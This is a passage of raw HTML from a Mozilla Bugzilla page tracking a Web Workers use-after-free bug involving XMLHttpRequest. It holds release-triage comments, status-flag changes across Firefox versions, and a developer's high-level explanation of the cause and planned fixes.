        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-24"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-24" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c24">Comment 24</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-09-24 08:22 PDT" data-time="1569338575">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-24">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-24" data-comment-id="14380912" data-ismarkdown="true" ><p>Still working, yes.  Expect an update soon.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bugmail)</span></div></div></div><div class="change-set" id="c25"><div class="comment" data-id="14415661" data-no="25"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-25" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a10066826_1689"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_451704" id="a10066826_1689"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-25"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-25" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c25">Comment 25</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-10-09 17:23 PDT" data-time="1570667029">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-25">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-25" data-comment-id="14415661" data-ismarkdown="true" ><p>I&#39;ll keep tracking this for 70 to keep it on the radar for potential dot release.</p>
</div></div><div class="change-set" id="c26"><div class="comment" data-id="14436452" data-no="26"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-26" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_24572" id="a10066826_1689"><img src="https://secure.gravatar.com/avatar/5293fe8fb106a442d842757758d07c56?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_24572" id="a10066826_1689"><a class="email " href="/user_profile?user_id=24572" > <span class="fna">Pascal Chevrel:pascalc (pto until November 2)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-26"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-26" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c26">Comment 26</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-10-21 01:07 PDT" data-time="1571645256">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-26">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-26" data-comment-id="14436452" data-ismarkdown="true" ><p>(In reply to Andrew Sutherland [:asuth] (he/him) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1545345#c24" title="RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest">comment #24</a>)</p>
<blockquote>
<p>Still working, yes.  Expect an update soon.</p>
</blockquote>
<p>Hi Andrew, do you have an update on this bug? Thanks</p>
</div><div class="activity"><div class="change">Flags: needinfo?(bugmail)</div></div></div><div class="change-set" id="a16124908_1689"><div class="change" id="aa16124908_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a16124908_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a16124908_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a16124908_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a16124908_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a16124908_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-10-21 12:53 PDT" data-time="1571687583">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">See Also:  &rarr; <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()"
   href="/show_bug.cgi?id=1546331">CVE-2019-17008</a></div></div></div><div class="change-set" id="a16361308_516138"><div class="change" id="aa16361308_516138">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_516138" id="a16361308_516138"><img src="https://secure.gravatar.com/avatar/3afcbed8f1748e0ae0da0bc4cabddcaf?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_516138" id="a16361308_516138"><a class="email " href="/user_profile?user_id=516138" > <span class="fna">Eden Chuang[:edenchuang]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a16361308_516138"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a16361308_516138">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a16361308_516138">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-10-24 06:33 PDT" data-time="1571923983">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">See Also:  &rarr; <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Assertion failure: js::GetNonCCWObjectRealm(wrapper) == js::GetContextRealm(cx), at /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:345"
   href="/show_bug.cgi?id=1557732">1557732</a></div></div></div><div class="change-set" id="a16884831_516138"><div class="change" id="aa16884831_516138">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_516138" id="a16884831_516138"><img src="https://secure.gravatar.com/avatar/3afcbed8f1748e0ae0da0bc4cabddcaf?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_516138" id="a16884831_516138"><a class="email " href="/user_profile?user_id=516138" > <span class="fna">Eden Chuang[:edenchuang]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a16884831_516138"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a16884831_516138">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a16884831_516138">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-10-30 07:58 PDT" data-time="1572447506">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">See Also: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()"
   href="/show_bug.cgi?id=1546331">CVE-2019-17008</a> &rarr; </div></div></div><div class="change-set" id="c27"><div class="comment" data-id="14497400" data-no="27"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-27" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_442218" id="a16884831_516138"><img src="https://secure.gravatar.com/avatar/c949006731dfdca9783f621522f42ca6?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_442218" id="a16884831_516138"><a class="email " href="/user_profile?user_id=442218" > <span class="fna">Andrew Overholt [:overholt]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-27"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-27" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c27">Comment 27</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-11-19 07:06 PST" data-time="1574176007">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-27">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-27" data-comment-id="14497400" data-ismarkdown="true" ><p>(For those playing along at home, Andrew Sutherland told me he&#39;s trying to figure out why this isn&#39;t reproducible on more recent builds (or how the testcase needs to be changed to do so)).</p>
</div></div><div class="change-set" id="c28"><div class="comment" data-id="14509649" data-no="28"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-28" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a16884831_516138"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_451704" id="a16884831_516138"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-28"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-28" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c28">Comment 28</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-11-25 09:04 PST" data-time="1574701467">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-28">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-28" data-comment-id="14509649" data-ismarkdown="true" ><p>Too late for a fix in 70 at this point.</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=isnotempty">status-firefox70</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=equals&amp;v1=wontfix">wontfix</a></div></div></div><div class="change-set" id="c29"><div class="comment" data-id="14538607" data-no="29"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-29" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a16884831_516138"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a16884831_516138"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-29"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-29" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c29">Comment 29</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-12-10 08:03 PST" data-time="1575993799">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-29">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-29" data-comment-id="14538607" data-ismarkdown="true" ><p>Finishing up attempting creating reproduction test case.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bugmail)</span></div></div></div><div class="change-set" id="c30"><div class="comment" data-id="14550922" data-no="30"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-30" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a16884831_516138"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_451704" id="a16884831_516138"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-30"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-30" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c30">Comment 30</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-12-16 15:31 PST" data-time="1576539102">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-30">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-30" data-comment-id="14550922" data-ismarkdown="true" ><p>We could still potentially get a patch into 72 beta, tracking for 72.</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=isnotempty">status-firefox72</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox73&amp;o1=isnotempty">status-firefox73</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox73&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox72&amp;o1=isnotempty">tracking-firefox72</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox72&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox73&amp;o1=isnotempty">tracking-firefox73</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox73&amp;o1=equals&amp;v1=%2B">+</a></div></div></div><div class="change-set" id="c31"><div class="comment" data-id="14551895" data-no="31"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-31" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_24572" id="a16884831_516138"><img src="https://secure.gravatar.com/avatar/5293fe8fb106a442d842757758d07c56?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_24572" id="a16884831_516138"><a class="email " href="/user_profile?user_id=24572" > <span class="fna">Pascal Chevrel:pascalc (pto until November 2)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-31"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-31" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c31">Comment 31</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-12-17 06:52 PST" data-time="1576594361">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-31">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-31" data-comment-id="14551895" data-ismarkdown="true" ><p>Too late for 71.</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox71&amp;o1=isnotempty">status-firefox71</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox71&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox71&amp;o1=equals&amp;v1=wontfix">wontfix</a></div></div></div><div class="change-set" id="c32"><div class="comment" data-id="14558726" data-no="32"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-32" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a16884831_516138"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_580382" id="a16884831_516138"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-32"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-32" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c32">Comment 32</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-12-20 07:38 PST" data-time="1576856288">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-32">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-32" data-comment-id="14558726" data-ismarkdown="true" ><p>72 seems unlikely now.</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=isnotempty">status-firefox72</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=equals&amp;v1=fix-optional">fix-optional</a></div></div></div><div class="change-set" id="a22150195_580382"><div class="change" id="aa22150195_580382">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a22150195_580382"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_580382" id="a22150195_580382"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a22150195_580382"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a22150195_580382">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a22150195_580382">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-12-30 05:34 PST" data-time="1577712870">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=isnotempty">status-firefox72</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=equals&amp;v1=fix-optional">fix-optional</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=equals&amp;v1=wontfix">wontfix</a></div></div></div><div class="change-set" id="a23045254_451704"><div class="change" id="aa23045254_451704">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a23045254_451704"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_451704" id="a23045254_451704"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a23045254_451704"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a23045254_451704">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a23045254_451704">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-09 14:12 PST" data-time="1578607929">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox74&amp;o1=isnotempty">status-firefox74</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox74&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox74&amp;o1=isnotempty">tracking-firefox74</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox74&amp;o1=equals&amp;v1=%2B">+</a></div></div></div><div class="change-set" id="a25188626_75935"><div class="change" id="aa25188626_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a25188626_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a25188626_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a25188626_75935"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a25188626_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a25188626_75935">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-02-03 09:35 PST" data-time="1580751301">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox73&amp;o1=isnotempty">status-firefox73</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox73&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox73&amp;o1=equals&amp;v1=wontfix">wontfix</a></div></div></div><div class="change-set" id="c33"><div class="comment" data-id="14660884" data-no="33"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-33" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a25188626_75935"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a25188626_75935"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-33"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-33" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c33">Comment 33</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-02-25 08:00 PST" data-time="1582646410">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-33">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-33" data-comment-id="14660884" data-ismarkdown="true" ><p>Attempts to re-create this on trunk post-landing of <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1588248" title="RESOLVED FIXED - Assertion failure: !mProxy-&gt;mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416">bug 1588248</a> seem to indicate that the problem has been mitigated since that landed in 72.  I believe the particular permutation of events was the Sync XHR on the stack twice with the DETH global destruction on the stack (and then multiple Unpin calls lined up).  Since it&#39;s no longer possible to get the same Sync XHR on the stack twice, the UAF is mitigated.</p>
<p>I&#39;m going to start putting up patches later today with variants of</p>
<ol>
<li>Allow the global to mark when JS shouldn&#39;t run.</li>
<li>Have BroadcastChannel/friends check to not even bother trying to run JS in the closing state.</li>
<li>Defer global destruction until the stack has actually unwound.</li>
</ol>
<p>Any of the 3 would have prevented the problem, although all 3 are required for sanity/correctness.</p>
</div></div><div class="change-set" id="c34"><div class="comment" data-id="14665783" data-no="34"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-34" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_24572" id="a25188626_75935"><img src="https://secure.gravatar.com/avatar/5293fe8fb106a442d842757758d07c56?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_24572" id="a25188626_75935"><a class="email " href="/user_profile?user_id=24572" > <span class="fna">Pascal Chevrel:pascalc (pto until November 2)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-34"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-34" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c34">Comment 34</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-02-27 11:48 PST" data-time="1582832928">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-34">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-34" data-comment-id="14665783" data-ismarkdown="true" ><p>Too late for 74.</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox74&amp;o1=isnotempty">status-firefox74</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox74&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox74&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox75&amp;o1=isnotempty">status-firefox75</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox75&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox75&amp;o1=isnotempty">tracking-firefox75</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox75&amp;o1=equals&amp;v1=%2B">+</a></div></div></div><div class="change-set" id="a27270812_75935"><div class="change" id="aa27270812_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a27270812_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a27270812_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a27270812_75935"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a27270812_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a27270812_75935">Updated</a>
          </h3>
          &bull;
